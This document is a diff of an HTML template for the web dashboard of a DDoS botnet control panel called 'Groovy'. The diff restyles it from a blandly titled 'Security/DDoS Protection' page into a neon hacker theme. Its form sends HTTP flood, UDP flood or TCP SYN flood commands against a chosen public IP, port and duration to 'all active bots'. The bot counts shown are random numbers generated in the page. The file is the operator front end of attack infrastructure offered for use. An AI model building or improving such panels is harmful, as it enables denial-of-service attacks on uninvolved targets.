@@ -1,188 +1,879 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard - Security/DDoS Protection</title>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; img-src 'self' data:; font-src 'self' https://cdnjs.cloudflare.com;">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    <title>Groovy - Command Center</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=VT323&display=swap" rel="stylesheet">
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            color: #333;
-            line-height: 1.6;
+        :root {
+            --neon-blue: #0ff0fc;
+            --neon-pink: #ff2a6d;
+            --neon-purple: #d300c5;
+            --dark-bg: #0d0221;
+            --darker-bg: #070113;
+            --terminal-green: #00ff41;
+            --terminal-yellow: #f9f002;
+            --glow: 0 0 10px;
+        }
+        
+        * {
             margin: 0;
             padding: 0;
-            background-color: #f9f9f9;
+            box-sizing: border-box;
         }
-
-        header {
-            background-color: #007bff;
-            color: #fff;
-            text-align: center;
-            padding: 20px 0;
+        
+        body {
+            font-family: 'VT323', 'Share Tech Mono', monospace;
+            background-color: var(--dark-bg);
+            color: var(--neon-blue);
+            line-height: 1.4;
+            letter-spacing: 1px;
+            position: relative;
+            overflow-x: hidden;
         }
-
-        main {
-            max-width: 800px;
-            margin: 20px auto;
-            padding: 20px;
-            background-color: #fff;
-            border-radius: 5px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        
+        /* CRT Scanlines Effect */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(
+                rgba(18, 16, 16, 0) 50%, 
+                rgba(0, 0, 0, 0.25) 50%
+            );
+            background-size: 100% 4px;
+            pointer-events: none;
+            z-index: 1000;
         }
-
-        h2 {
-            color: #007bff;
-            border-bottom: 2px solid #007bff;
-            padding-bottom: 10px;
-            margin-bottom: 20px;
+        
+        /* Screen Flicker Animation */
+        @keyframes flicker {
+            0% { opacity: 0.9; }
+            5% { opacity: 0.8; }
+            10% { opacity: 0.95; }
+            15% { opacity: 0.87; }
+            20% { opacity: 1; }
+            100% { opacity: 1; }
         }
-
+        
+        body {
+            animation: flicker 20s infinite;
+        }
+        
         .container {
-            margin-bottom: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            position: relative;
         }
-
-        label {
-            display: block;
+        
+        header {
+            background-color: rgba(13, 2, 33, 0.8);
+            color: var(--neon-blue);
+            padding: 1rem 0;
+            border-bottom: 1px solid var(--neon-purple);
+            box-shadow: 0 0 20px var(--neon-purple);
+            position: relative;
+            z-index: 100;
+        }
+        
+        /* Glitch Effect */
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+        
+        .logo {
+            font-size: 2rem;
             font-weight: bold;
-            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--neon-pink);
+            text-shadow: var(--glow) var(--neon-pink);
+            animation: glitch 5s infinite;
         }
-
-        input[type="text"],
-        input[type="number"] {
+        
+        .logo i {
+            font-size: 2.2rem;
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .nav-links a {
+            color: var(--neon-blue);
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            text-shadow: var(--glow) var(--neon-blue);
+            position: relative;
+            font-size: 1.2rem;
+        }
+        
+        .nav-links a:hover {
+            color: var(--terminal-green);
+            text-shadow: var(--glow) var(--terminal-green);
+            background-color: rgba(0, 255, 65, 0.1);
+        }
+        
+        .nav-links a::after {
+            content: ']';
+            margin-left: 5px;
+        }
+        
+        .nav-links a::before {
+            content: '[';
+            margin-right: 5px;
+        }
+        
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .dashboard-container {
+            margin: 2rem auto;
+            position: relative;
+            border: 1px solid var(--neon-purple);
+            box-shadow: 0 0 30px rgba(211, 0, 197, 0.3);
+            padding: 2rem;
+            background-color: rgba(13, 2, 33, 0.7);
+        }
+        
+        .dashboard-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+            border-bottom: 1px dashed var(--neon-blue);
+            padding-bottom: 1rem;
+        }
+        
+        .dashboard-header h1 {
+            color: var(--terminal-green);
+            font-size: 2.5rem;
+            text-shadow: var(--glow) var(--terminal-green);
+            margin-bottom: 0.5rem;
+        }
+        
+        .dashboard-header p {
+            color: var(--neon-blue);
+            font-size: 1.3rem;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+        }
+        
+        .stat-card {
+            background-color: rgba(7, 1, 19, 0.8);
+            border-radius: 0;
+            padding: 1.5rem;
+            border: 1px solid var(--neon-blue);
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            z-index: -1;
+            background: linear-gradient(45deg, var(--neon-blue), var(--neon-purple), var(--neon-pink));
+            background-size: 400%;
+            opacity: 0;
+            transition: 0.5s;
+        }
+        
+        .stat-card:hover::before {
+            opacity: 1;
+            animation: animate 8s linear infinite;
+        }
+        
+        @keyframes animate {
+            0% { background-position: 0 0; }
+            50% { background-position: 300% 0; }
+            100% { background-position: 0 0; }
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 25px rgba(0, 255, 65, 0.4);
+        }
+        
+        .stat-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+        
+        .stat-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            background-color: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--neon-blue);
+        }
+        
+        .stat-icon.primary {
+            color: var(--neon-blue);
+            border-color: var(--neon-blue);
+        }
+        
+        .stat-icon.success {
+            color: var(--terminal-green);
+            border-color: var(--terminal-green);
+        }
+        
+        .stat-icon.warning {
+            color: var(--terminal-yellow);
+            border-color: var(--terminal-yellow);
+        }
+        
+        .stat-icon.danger {
+            color: var(--neon-pink);
+            border-color: var(--neon-pink);
+        }
+        
+        .stat-value {
+            font-size: 2.5rem;
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+            font-family: 'Share Tech Mono', monospace;
+        }
+        
+        .stat-card:nth-child(1) .stat-value {
+            color: var(--neon-blue);
+            text-shadow: var(--glow) var(--neon-blue);
+        }
+        
+        .stat-card:nth-child(2) .stat-value {
+            color: var(--terminal-green);
+            text-shadow: var(--glow) var(--terminal-green);
+        }
+        
+        .stat-card:nth-child(3) .stat-value {
+            color: var(--terminal-yellow);
+            text-shadow: var(--glow) var(--terminal-yellow);
+        }
+        
+        .stat-card:nth-child(4) .stat-value {
+            color: var(--neon-pink);
+            text-shadow: var(--glow) var(--neon-pink);
+        }
+        
+        .stat-label {
+            color: var(--neon-blue);
+            font-size: 1.1rem;
+            opacity: 0.8;
+        }
+        
+        .command-card {
+            background-color: rgba(7, 1, 19, 0.8);
+            border-radius: 0;
+            padding: 2rem;
+            border: 1px solid var(--neon-purple);
+            margin-bottom: 2rem;
+            box-shadow: 0 0 20px rgba(211, 0, 197, 0.2);
+        }
+        
+        .command-card h2 {
+            color: var(--terminal-green);
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.8rem;
+            text-shadow: var(--glow) var(--terminal-green);
+        }
+        
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: var(--neon-blue);
+            font-size: 1.2rem;
+        }
+        
+        .form-control {
             width: 100%;
-            padding: 10px;
+            padding: 0.8rem 1rem;
+            border: 1px solid var(--neon-blue);
+            border-radius: 0;
             font-size: 1rem;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            box-sizing: border-box;
-            margin-bottom: 20px;
+            transition: all 0.3s ease;
+            background-color: rgba(0, 0, 0, 0.3);
+            color: var(--terminal-green);
+            font-family: 'Share Tech Mono', monospace;
         }
-
-        select {
-            width: 100%;
-            padding: 10px;
-            font-size: 1rem;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            box-sizing: border-box;
-            margin-bottom: 20px;
+        
+        .form-control:focus {
+            border-color: var(--neon-pink);
+            box-shadow: 0 0 10px var(--neon-pink);
+            outline: none;
+            background-color: rgba(0, 0, 0, 0.5);
         }
-
+        
+        select.form-control {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%230ff0fc'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 1rem center;
+            background-size: 1rem;
+        }
+        
         .btn {
-            display: inline-block;
-            padding: 12px 20px;
-            font-size: 1rem;
-            border: none;
-            border-radius: 5px;
+            padding: 0.8rem 1.5rem;
+            border-radius: 0;
+            font-weight: 600;
+            font-size: 1.2rem;
             cursor: pointer;
-            background-color: #007bff;
-            color: #fff;
-            transition: background-color 0.3s ease;
-        }
-
-        .btn:hover {
-            background-color: #0056b3;
-        }
-
-        .logout-button {
-            padding: 12px 20px;
-            font-size: 1rem;
-            cursor: pointer;
-            background-color: #dc3545;
-            color: #fff;
+            transition: all 0.3s ease;
             border: none;
-            border-radius: 5px;
-            transition: background-color 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-family: 'VT323', monospace;
+            letter-spacing: 2px;
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
         }
-
-        .logout-button:hover {
-            background-color: #c82333;
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 0;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.1);
+            transition: all 0.3s;
+            z-index: -1;
+        }
+        
+        .btn:hover::before {
+            width: 100%;
+        }
+        
+        .btn-primary {
+            background-color: transparent;
+            color: var(--terminal-green);
+            border: 1px solid var(--terminal-green);
+            text-shadow: var(--glow) var(--terminal-green);
+        }
+        
+        .btn-primary:hover {
+            background-color: rgba(0, 255, 65, 0.1);
+            transform: translateY(-2px);
+            box-shadow: 0 0 20px var(--terminal-green);
+        }
+        
+        .btn-danger {
+            background-color: transparent;
+            color: var(--neon-pink);
+            border: 1px solid var(--neon-pink);
+            text-shadow: var(--glow) var(--neon-pink);
+        }
+        
+        .btn-danger:hover {
+            background-color: rgba(255, 42, 109, 0.1);
+            transform: translateY(-2px);
+            box-shadow: 0 0 20px var(--neon-pink);
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+        
+        .recent-activity {
+            background-color: rgba(7, 1, 19, 0.8);
+            border-radius: 0;
+            padding: 2rem;
+            border: 1px solid var(--neon-blue);
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
+        }
+        
+        .activity-list {
+            list-style: none;
+        }
+        
+        .activity-item {
+            padding: 1rem 0;
+            border-bottom: 1px dashed var(--neon-purple);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .activity-item:last-child {
+            border-bottom: none;
+        }
+        
+        .activity-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 0;
+            background-color: rgba(0, 0, 0, 0.3);
+            color: var(--neon-blue);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid var(--neon-blue);
+        }
+        
+        .activity-content h4 {
+            margin-bottom: 0.3rem;
+            color: var(--terminal-green);
+            font-size: 1.3rem;
+        }
+        
+        .activity-content p {
+            color: var(--neon-blue);
+            font-size: 1.1rem;
+            opacity: 0.8;
+        }
+        
+        .activity-time {
+            margin-left: auto;
+            color: var(--terminal-yellow);
+            font-size: 1rem;
+        }
+        
+        footer {
+            background-color: rgba(13, 2, 33, 0.8);
+            color: var(--neon-blue);
+            padding: 1.5rem 0;
+            text-align: center;
+            border-top: 1px solid var(--neon-purple);
+            box-shadow: 0 0 20px var(--neon-purple);
+            margin-top: 2rem;
+        }
+        
+        .footer-content {
+            max-width: 700px;
+            margin: 0 auto;
+        }
+        
+        .copyright {
+            color: var(--neon-blue);
+            font-size: 1rem;
+            opacity: 0.7;
+        }
+        
+        .success-message {
+            background-color: rgba(0, 255, 65, 0.1);
+            color: var(--terminal-green);
+            padding: 1rem;
+            border: 1px solid var(--terminal-green);
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            display: none;
+            font-size: 1.2rem;
+        }
+        
+        /* Terminal Typing Effect */
+        @keyframes typing {
+            from { width: 0 }
+            to { width: 100% }
+        }
+        
+        @keyframes blink-caret {
+            from, to { border-color: transparent }
+            50% { border-color: var(--terminal-green) }
+        }
+        
+        .typing-effect {
+            overflow: hidden;
+            border-right: .15em solid var(--terminal-green);
+            white-space: nowrap;
+            margin: 0 auto;
+            letter-spacing: .15em;
+            animation: 
+                typing 3.5s steps(40, end),
+                blink-caret .75s step-end infinite;
+        }
+        
+        /* Binary Rain Background */
+        .binary-rain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.1;
+            pointer-events: none;
+        }
+        
+        /* Responsive Adjustments */
+        @media (max-width: 768px) {
+            .dashboard-header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 1rem;
+            }
+            
+            .btn-group {
+                flex-direction: column;
+                width: 100%;
+            }
+            
+            .btn {
+                width: 100%;
+            }
+            
+            .logo {
+                font-size: 1.5rem;
+            }
+            
+            .nav-links {
+                gap: 10px;
+            }
+            
+            .nav-links a {
+                font-size: 1rem;
+                padding: 0.3rem 0.5rem;
+            }
         }
     </style>
 </head>
-
 <body>
+    <!-- Binary Rain Background -->
+    <canvas id="binaryRain" class="binary-rain"></canvas>
+    
     <header>
-        <h1>Welcome to the Dashboard</h1>
-        <p>This is a secure area. Use the form below to send commands:</p>
+        <div class="container">
+            <nav>
+                <div class="logo">
+                    <i class="fas fa-skull"></i>
+                    <span>Groovy </span>
+                </div>
+                <div class="nav-links">
+                    <a href="/dashboard"><i class="fas fa-terminal"></i> DASHBOARD</a>
+                    <a href="/profile"><i class="fas fa-user-secret"></i> PROFILE</a>
+                    <a href="/logout"><i class="fas fa-power-off"></i> LOGOUT</a>
+                </div>
+            </nav>
+        </div>
     </header>
 
-    <main>
-        <h2>Welcome, {{ . }}</h2>
-        <div class="container">
+    <div class="container dashboard-container">
+        <div class="dashboard-header">
+            <div>
+                <h1 class="typing-effect">WELCOME, {{ .Username }}</h1>
+                <p>>_ SECURITY COMMAND CENTER [ACTIVE]</p>
+            </div>
+            <div class="btn-group">
+                <a href="/profile" class="btn btn-primary">
+                    <i class="fas fa-user-secret"></i> PROFILE
+                </a>
+                <a href="/logout" class="btn btn-danger">
+                    <i class="fas fa-power-off"></i> LOGOUT
+                </a>
+            </div>
+        </div>
+
+        <div class="success-message" id="successMessage">
+            <i class="fas fa-check-circle"></i>
+            <span>>_ COMMAND SENT TO ALL ACTIVE BOTS</span>
+        </div>
+
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-header">
+                    <div>
+                        <div class="stat-value" id="activeBots">0</div>
+                        <div class="stat-label">ACTIVE BOTS</div>
+                    </div>
+                    <div class="stat-icon primary">
+                        <i class="fas fa-robot"></i>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="stat-card">
+                <div class="stat-header">
+                    <div>
+                        <div class="stat-value" id="totalCommands">0</div>
+                        <div class="stat-label">TOTAL COMMANDS</div>
+                    </div>
+                    <div class="stat-icon success">
+                        <i class="fas fa-terminal"></i>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="stat-card">
+                <div class="stat-header">
+                    <div>
+                        <div class="stat-value" id="uptime">100%</div>
+                        <div class="stat-label">SYSTEM UPTIME</div>
+                    </div>
+                    <div class="stat-icon warning">
+                        <i class="fas fa-server"></i>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="stat-card">
+                <div class="stat-header">
+                    <div>
+                        <div class="stat-value" id="threats">0</div>
+                        <div class="stat-label">THREATS BLOCKED</div>
+                    </div>
+                    <div class="stat-icon danger">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="command-card">
+            <h2><i class="fas fa-terminal"></i> SEND COMMAND</h2>
             <form id="commandForm" action="/send-command" method="post">
-                <div class="input-group">
-                    <label for="method">Method:</label>
-                    <select id="method" name="method" required>
-                        <option value="HTTP">HTTP</option>
-                        <option value="UDP">UDP</option>
-                        <option value="TCP">TCP</option>
+                <input type="hidden" name="csrf_token" value="{{ .CSRFToken }}">
+                <div class="form-group">
+                    <label for="method">>_ ATTACK METHOD</label>
+                    <select id="method" name="method" class="form-control" required>
+                        <option value="">SELECT A METHOD</option>
+                        <option value="HTTP">HTTP FLOOD</option>
+                        <option value="UDP">UDP FLOOD</option>
+                        <option value="TCP">TCP SYN FLOOD</option>
                     </select>
                 </div>
-                <div class="input-group">
-                    <label for="ip">IP Address:</label>
-                    <input type="text" id="ip" name="ip" required>
+                
+                <div class="form-group">
+                    <label for="ip">>_ TARGET IP ADDRESS</label>
+                    <input type="text" id="ip" name="ip" class="form-control" placeholder="ENTER TARGET IP" required>
                 </div>
-                <div class="input-group">
-                    <label for="duration">Duration (seconds):</label>
-                    <input type="number" id="duration" name="duration" min="1" required>
+                
+                <div class="form-group">
+                    <label for="port">>_ TARGET PORT</label>
+                    <input type="text" id="port" name="port" class="form-control" placeholder="ENTER TARGET PORT" required>
                 </div>
-                <div class="input-group">
-                    <label for="port">Port:</label>
-                    <input type="text" id="port" name="port" required>
+                
+                <div class="form-group">
+                    <label for="duration">>_ DURATION (SECONDS)</label>
+                    <input type="number" id="duration" name="duration" class="form-control" placeholder="1-240 SECONDS" min="1" max="240" required>
                 </div>
-                <button type="submit" onclick="validateinputs()" class="btn">Send Command</button>
-                <button class="logout-button" onclick="window.location.href='/logout'">Logout</button>
+                
+                <button type="submit" class="btn btn-primary">
+                    <i class="fas fa-paper-plane"></i> SEND COMMAND
+                </button>
             </form>
         </div>
-        <p>This is a secure dashboard. Explore the features to manage your security settings.</p>
-    </main>
-</body>
 
-</html>
+        <div class="recent-activity">
+            <h2><i class="fas fa-history"></i> RECENT ACTIVITY</h2>
+            <ul class="activity-list" id="activityList">
+                <li class="activity-item">
+                    <div class="activity-icon">
+                        <i class="fas fa-bell"></i>
+                    </div>
+                    <div class="activity-content">
+                        <h4>SYSTEM ONLINE</h4>
+                        <p>SECURITY SYSTEM INITIALIZED AND RUNNING</p>
+                    </div>
+                    <div class="activity-time">JUST NOW</div>
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <p class="copyright">© 1983 Groovy SYSTEMS | ALL RIGHTS RESERVED</p>
+            </div>
+        </div>
+    </footer>
 
     <script>
-        function validateDuration() {
-            const durationInput = document.getElementById("duration");
-            const durationValue = parseInt(durationInput.value, 10);
-            if (isNaN(durationValue) || durationValue < 1 || durationValue > 240) {
-                alert("Please enter a valid duration between 1 and 240 Seconds.");
-                durationInput.value = "";
+        // Binary Rain Background
+        const canvas = document.getElementById('binaryRain');
+        const ctx = canvas.getContext('2d');
+        
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const binary = '01';
+        const columns = Math.floor(canvas.width / 20);
+        const drops = [];
+        
+        for (let i = 0; i < columns; i++) {
+            drops[i] = Math.floor(Math.random() * canvas.height);
+        }
+        
+        function drawBinaryRain() {
+            ctx.fillStyle = 'rgba(13, 2, 33, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = '#0ff0fc';
+            ctx.font = '15px Share Tech Mono';
+            
+            for (let i = 0; i < drops.length; i++) {
+                const text = binary.charAt(Math.floor(Math.random() * binary.length));
+                ctx.fillText(text, i * 20, drops[i] * 20);
+                
+                if (drops[i] * 20 > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                
+                drops[i]++;
             }
         }
-        function portValidation() {
-            const portInput = document.getElementById("port");
-            const portValue = parseInt(portInput.value, 10);
-            if (isNaN(portValue) || portValue < 1 || portValue > 65535) {
-                alert("Please enter a valid port number between 1 and 65535.");
-                portInput.value = "";
-            }
-        }
-
-        function ipValidation() {
-            const ipInput = document.getElementById("ip");
-            const ipValue = ipInput.value.trim();
-
-            if (!isValidIPv4(ipValue)) {
-                alert("Please enter a valid IPv4 address.");
-                ipInput.value = "";
+        
+        setInterval(drawBinaryRain, 50);
+        
+        // Simulate active bots count
+        setInterval(() => {
+            const bots = Math.floor(Math.random() * 50) + 10;
+            document.getElementById('activeBots').textContent = bots;
+        }, 3000);
+        
+        // Simulate total commands
+        setInterval(() => {
+            const commands = Math.floor(Math.random() * 1000) + 500;
+            document.getElementById('totalCommands').textContent = commands.toLocaleString();
+        }, 5000);
+        
+        // Simulate threats blocked
+        setInterval(() => {
+            const threats = Math.floor(Math.random() * 10000) + 2500;
+            document.getElementById('threats').textContent = threats.toLocaleString();
+        }, 7000);
+        
+        document.getElementById('commandForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Validate inputs
+            const method = document.getElementById('method').value;
+            const ip = document.getElementById('ip').value;
+            const port = document.getElementById('port').value;
+            const duration = document.getElementById('duration').value;
+            
+            if (!method || !ip || !port || !duration) {
+                alert('>_ ERROR: ALL FIELDS REQUIRED');
                 return;
             }
-
-            if (isPrivateOrOwnIP(ipValue)) {
-                alert("Please enter a valid public IPv4 address.");
-                ipInput.value = "";
+            
+            if (duration < 1 || duration > 240) {
+                alert('>_ ERROR: DURATION MUST BE 1-240 SECONDS');
+                return;
             }
-        }
-
-        // Function to validate IPv4 format
+            
+            // Show success message
+            const successMessage = document.getElementById('successMessage');
+            successMessage.style.display = 'flex';
+            
+            // Add to activity log
+            const activityList = document.getElementById('activityList');
+            const now = new Date();
+            const timeString = now.toLocaleTimeString().toUpperCase();
+            
+            const newActivity = document.createElement('li');
+            newActivity.className = 'activity-item';
+            newActivity.innerHTML = `
+                <div class="activity-icon">
+                    <i class="fas fa-terminal"></i>
+                </div>
+                <div class="activity-content">
+                    <h4>COMMAND SENT</h4>
+                    <p>${method} ATTACK TO ${ip}:${port} FOR ${duration} SECONDS</p>
+                </div>
+                <div class="activity-time">${timeString}</div>
+            `;
+            
+            activityList.insertBefore(newActivity, activityList.firstChild);
+            
+            // Submit the form after validation
+            setTimeout(() => {
+                this.submit();
+            }, 1000);
+        });
+        
+        // Input validation
+        document.getElementById('ip').addEventListener('blur', function() {
+            const ip = this.value.trim();
+            if (!isValidIPv4(ip)) {
+                alert('>_ ERROR: INVALID IPv4 ADDRESS');
+                this.value = '';
+            } else if (isPrivateOrOwnIP(ip)) {
+                alert('>_ ERROR: CANNOT TARGET PRIVATE/LOCAL IP');
+                this.value = '';
+            }
+        });
+        
+        document.getElementById('port').addEventListener('blur', function() {
+            const port = parseInt(this.value);
+            if (isNaN(port)) {
+                alert('>_ ERROR: PORT MUST BE A NUMBER');
+                this.value = '';
+            } else if (port < 1 || port > 65535) {
+                alert('>_ ERROR: PORT MUST BE 1-65535');
+                this.value = '';
+            }
+        });
+        
+        document.getElementById('duration').addEventListener('blur', function() {
+            const duration = parseInt(this.value);
+            if (isNaN(duration)) {
+                alert('>_ ERROR: DURATION MUST BE A NUMBER');
+                this.value = '';
+            } else if (duration < 1 || duration > 240) {
+                alert('>_ ERROR: DURATION MUST BE 1-240 SECONDS');
+                this.value = '';
+            }
+        });
+        
         function isValidIPv4(ip) {
             const ipRegex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
             return ipRegex.test(ip);
         }
-
-        // Function to check if IP is private or matches the server's own IP
+        
         function isPrivateOrOwnIP(ip) {
             const privateRanges = [
                 "10.",                   // 10.0.0.0/8
@@ -207,19 +898,22 @@
             return isInPrivateRange || isOwnIP;
         }
 
-        function validatemethods() {
-            const methodInput = document.getElementById("method");
-            const methodValue = methodInput.value;
-            if (methodValue !== "HTTP" && methodValue !== "UDP" && methodValue !== "TCP") {
-                alert("Please select a valid method.");
-                methodInput.value = "HTTP";
-            }
-        }
-
-        function validateinputs() {
-            validatemethods();
-            validateDuration();
-            portValidation();
-            ipValidation();
-        }
+        // Button loading state
+        document.querySelectorAll('form').forEach(form => {
+            form.addEventListener('submit', function(e) {
+                const submitButton = this.querySelector('button[type="submit"]');
+                if (submitButton) {
+                    submitButton.disabled = true;
+                    submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
+                }
+            });
+        });
+        
+        // Window resize handler for binary rain
+        window.addEventListener('resize', function() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
     </script>
+</body>
+</html>
